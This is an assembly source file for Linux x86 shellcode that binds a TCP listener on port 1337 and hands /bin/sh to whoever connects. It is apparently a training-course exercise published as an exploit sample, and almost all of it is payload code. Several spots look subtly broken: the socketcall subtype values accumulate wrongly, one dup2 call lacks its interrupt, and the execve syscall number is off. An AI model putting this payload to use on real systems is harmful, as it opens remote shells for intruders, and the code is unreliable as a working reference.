# linux/x86 - Shell Bind TCP Shellcode (SLAE)
# This shellcode will listen on port 1337
# Author: Vitor Esperanša
# Tested on: Debian GNU/Linux 8 


global _start

section .text

_start:

	; SOCKET CALL
	xor eax, eax
	mov ebx, eax
	push eax
	add al, 0x66		; syscall 102 (socketcall)
	add bl, 0x1		; sys_socket  (syscall type)

	 
	push 0			; IPPROTO_IP = 0 
	push 1			; SOCK_STREAM = 1 
	push 2			; AF_INET = 2
 	mov ecx, esp

	int 0x80

        ; bind
	
	mov edx, eax            ; sockfd on EDX         
	add al, 0x66            ; syscall: 102
	add bl, 0x2             ; syscall type: sys_bind 
	push 0			; INADDR_ANY = 0 
	push WORD 0x3905	; Port = 1337
	push WORD 2		; AF_INET = 2
	mov ecx, esp		; save pointer to sockaddr_in struct

	
	push 16
	push ecx
 	push edx         

	mov ecx, esp
	
	int 0x80

	; LISTENING (syscall 102)

	add al, 0x66 
	add bl, 0x4 ; sys_listen (syscall type)
	
	push 0  ; backlog
	push edx ; sockfd
	
	int 0x80

	; ACCEPT

	add al, 0x66
	add bl ,0x5
	
	push 0
	push 0
	push edx
	mov ecx, esp
	
	int 0x80

	mov edx, eax ; saving  the client sockfd on EDX

	; DUP2 (stdin, stdout, stderr)

	mov eax, 0x63
 	mov ebx, edx
	mov ecx, 0
	
	int 0x80 

	mov eax, 0x63
 	mov ecx, 0x1

	mov eax, 0x63
	mov ecx, 0x2
	
	int 0x80


	; EXECVE (syscall 11)

	add al, 11		; 

	; execve string argument
	
	push 0
	push 0x68732f2f		; "//sh"
	push 0x6e69622f		; "/bin"
	mov ebx, esp		; pointer to "/bin//sh" 
	mov ecx, 0		
	mov edx, 0		

	int 0x80